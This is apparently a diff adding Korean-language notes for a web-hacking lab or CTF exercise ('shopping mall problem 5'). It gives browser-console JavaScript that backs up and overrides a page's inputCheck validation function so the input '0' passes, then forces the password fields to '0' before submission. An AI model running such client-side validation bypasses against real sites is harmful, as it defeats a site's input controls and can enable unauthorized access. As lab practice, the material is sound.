@@ -1,0 +1,49 @@
+==========================
+
+* 쇼핑몰 문제 5번
+
+==========================
+
+1.// 안전장치: 기존 함수 백업(원복 가능)
+if (!window.__orig_inputCheck__) {
+  window.__orig_inputCheck__ = window.inputCheck;
+  console.log('원본 inputCheck 백업됨 -> window.__orig_inputCheck__');
+}
+
+// 덮어쓰기: '0' 일 때만 바로 통과시키고, 나머지는 원본 로직 호출 (가능하면)
+window.inputCheck = function() {
+  try {
+    var inputValue = $(".inputValue").val();
+    // '0'이면 바로 암호화(있으면 encryptString 사용) 후 true 반환
+    if (inputValue === '0') {
+      if (typeof encryptString === 'function') {
+        var encInput = encryptString(inputValue);
+        $(".inputValue").val(encInput);
+      } else {
+        // encryptString이 없으면 그대로 넣음
+        $(".inputValue").val(inputValue);
+      }
+      console.log("inputCheck 우회: '0' 입력을 허용합니다.");
+      return true;
+    }
+    // '0'이 아니면 원본 로직이 있으면 호출(없으면 기존 허용 or 거부 판단)
+    if (typeof window.__orig_inputCheck__ === 'function') {
+      return window.__orig_inputCheck__();
+    }
+    // 원본이 없다면 기본적으로 true 반환 (필요에 따라 false로 바꿔라)
+    return true;
+  } catch (e) {
+    console.error('inputCheck override error:', e);
+    return true;
+  }
+};
+
+// (옵션) 비밀번호 값 강제 설정 후 제출
+var pw = document.querySelector('#password') || document.querySelector('.inputValue') || document.querySelector('input[name="password"]');
+var conf = document.querySelector('#passwordconfirm') || document.querySelector('input[name="passwordconfirm"]');
+if (pw) { pw.value = '0'; if (conf) conf.value = '0'; console.log("비밀번호 필드에 '0' 설정됨. 제출하세요."); }
+
+
+2. javascript_filtering
+
+==========================
